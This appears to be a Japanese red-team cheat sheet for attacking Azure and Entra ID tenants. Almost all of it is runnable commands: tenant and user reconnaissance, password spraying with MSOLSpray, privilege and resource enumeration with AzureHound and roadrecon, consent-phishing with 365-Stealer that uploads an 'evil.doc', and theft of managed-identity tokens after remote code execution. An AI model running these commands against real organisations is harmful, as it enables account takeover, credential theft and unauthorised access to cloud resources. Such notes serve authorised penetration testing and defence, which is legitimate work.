# AzureCloud-EntraID

### ユーザ名（プリンシパル名・メールアドレス）からのテナント情報の取得
```
# AADInternals

> Get-AADIntLoginInformation -UserName admin@microsoft.onmicrosoft.com
```

### ドメインからのテナントIDの取得
```
# AADInternals

> Get-AADIntTenantID -Domain microsoft.onmicrosoft.com
```

### Entra IDとして機能するメールアドレスの特定
```
# o365creeper
# C:\temp\users.txt : ユーザ名のリスト

> C:\Python27\python.exe .\o365creeper.py -f C:\temp\users.txt -o C:\temp\validusers.txt
```

### ベース文字列からのAzureリソース検索
```
# MicroBurst
# サブドメイン
> Invoke-EnumerateAzureSubDomains -Base microsoft -Verbose

# Blobストレージ
> Invoke-EnumerateAzureBlobs -Base microsoft -Verbose
```

### パスワードスプレー攻撃
```
# MSOLSpray
# C:\temp\validemails.txt : ユーザ名のリスト

> Invoke-MSOLSpray -UserList C:\temp\validusers.txt -Password P@ssw0rd -Verbose
```

### AzureADモジュール
```
# ログイン
> Install-Module AzureAD -Scope CurrentUser
> Import-Module AzureAD
> $passwd = ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force
> $creds = New-Object System.Management.Automation.PSCredential ("test@contoso.onmicrosoft.com", $passwd)
> Connect-AzureAD -Credential $creds

# 全ユーザの列挙
> Get-AzureADUser -All $true
> Get-AzureADUser -All $true | select UserPrincipalName

# 全グループの列挙
> Get-AzureADGroup -All $true

# 全デバイスの列挙
> Get-AzureADDevice

# グローバル管理者ロールの付与されたユーザの列挙
> Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember
```

### AzureADPreviewモジュール
```
# ログイン
> Install-Module AzureADPreview -Scope CurrentUser
> Import-Module AzureADPreview
> $passwd = ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force
> $creds = New-Object System.Management.Automation.PSCredential ("test@contoso.onmicrosoft.com", $passwd)
> Connect-AzureAD -Credential $creds

# カスタムロールの列挙
> Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} | select DisplayName

# 外部アプリケーションの利用可否調査
> (Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```

### Azモジュール
```
# ログイン
> Install-Module Az -scope CurrentUser

> $passwd = ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force
> $creds = New-Object System.Management.Automation.PSCredential ("test@contoso.onmicrosoft.com", $passwd)
> Connect-AzAccount -Credential $creds

# ログイン（Azure Resource Manager APIトークン）
> $Token = 'eyJ0eX..'
> Connect-AzAccount -AccessToken $Token -AccountId <client_id>

# ログイン（Microsoft Graph API、Azure Resource Manager APIトークン）
> $Token = 'eyJ0eX..'
> $graphToken = 'eyJ0eX..'
> Connect-AzAccount -AccessToken $Token -MicrosoftGraphAccessToken $graphToken -AccountId <client_id>

# ログイン中のユーザでアクセス可能なAzureリソースを列挙
> Get-AzResource

# ログイン中のユーザに付与されているAzureリソースに対するロールを列挙
> Get-AzRoleAssignment
> Get-AzRoleAssignment -SignInName test@contoso.onmicrosoft.com
> Get-AzRoleDefinition -Name 'Virtual Machine Command Executor'
> Get-AzRoleDefinition -Name 'Key Vault Secrets User'

# ログイン中のユーザでアクセス可能なVirtualMachineを列挙
> Get-AzVM | fl

# ログイン中のユーザでアクセス可能なApp Servicesを列挙
 > Get-AzWebApp
 > Get-AzWebApp | ?{$_.Kind -notmatch "functionapp"}

# ログイン中のユーザでアクセス可能なAzure Functionsを列挙
 > Get-AzFunctionApp

# ログイン中のユーザでアクセス可能なストレージアカウントを列挙
> Get-AzStorageAccount | fl

# ログイン中のユーザでアクセス可能なKey Vaultを列挙
> Get-AzKeyVault
```

### azコマンド
```
# ログイン
> az login -u test@contoso.onmicrosoft.com -p P@ssw0rd

# Virtual Machineの列挙
> az vm list
> az vm list --query "[].[name]" -o table

# App Servicesの列挙
> az webapp list
> az webapp list --query "[].[name]" -o table

# Azure Functionsの列挙
> az functionapp list
> az functionapp list --query "[].[name]" -o table

# ストレージアカウントの列挙
> az storage account list

# Key Vaultの列挙
> az keyvault list
```

### roadreconによるEntra ID列挙
```
> roadrecon auth -u test@contoso.onmicrosoft.com -p P@ssw0rd
> roadrecon gather
> roadrecon gui

# 条件付きアクセスポリシーの列挙
> roadrecon plugin policies
```

### stormspotterによるAzureリソース列挙
```
# バックエンド環境の起動（別途neo4jも必要）
> python .\stormspotter\backend\ssbackend.pyz

# フロントエンド環境の起動
> .\stormspotter\frontend\dist\spa\quasar.cmd serve -p 9091 --history

# コレクターの実行
> az login -u test@contoso.onmicrosoft.com -p P@ssw0rd
> python .\stormspotter\stormcollector\sscollector.pyz cli
```

### AzureHoundによるAzureCloud列挙
```
# コレクターの実行
> $passwd = ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force
> $creds = New-Object System.Management.Automation.PSCredential ("test@contoso.onmicrosoft.com", $passwd)
> Connect-AzAccount -Credential $creds
> Import-Module AzureAD
> Connect-AzureAD -Credential $creds

> Import-Module .\AzureHound.ps1
> Invoke-AzureHound -Verbose

# BloouHoundでの解析（CYPHER QUERY）
MATCH (n) WHERE n.azname IS NOT NULL AND n.azname <> "" AND n.name IS NULL SET n.name = n.azname
MATCH p =(n)-[r:AZGlobalAdmin*1..]->(m) RETURN p
MATCH p = (n)-[r]->(g:AZKeyVault) RETURN p
```

### フィッシングによる認証情報窃取（365stealer）
```
#設定＆起動
> python 365-Stealer.py --set-config
> python 365-Stealer.py --run-app

# OneDriveへのファイルアップロード
> python 365-Stealer.py --refresh-user test@contoso.onmicrosoft.com --upload evil.doc
```

### マネージドIDの認証情報窃取（RCE）
```
> curl $IDENTITY_ENDPOINT?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
> curl $IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```

### Microsoft Graph APIへのアクセス
```
> $Token = 'eyJ0eX..'
# テナント内の全ユーザ列挙
> $URI = 'https://graph.microsoft.com/v1.0/users'
# テナント内のエンタープライズアプリケーション列挙
> $URI = 'https://graph.microsoft.com/v1.0/applications'
> $RequestParams = @{
 Method = 'GET'
 Uri = $URI
 Headers = @{
 'Authorization' = "Bearer $Token"
 }
}

> (Invoke-RestMethod @RequestParams).value
```

### Azure Resource Manager APIへのアクセス
```
# サブスクリプションの列挙
> $Token = 'eyJ0eX..'
> $URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
> $RequestParams = @{
 Method = 'GET'
 Uri = $URI
 Headers = @{
 'Authorization' = "Bearer $Token"
 }
}
> (Invoke-RestMethod @RequestParams).value 
```
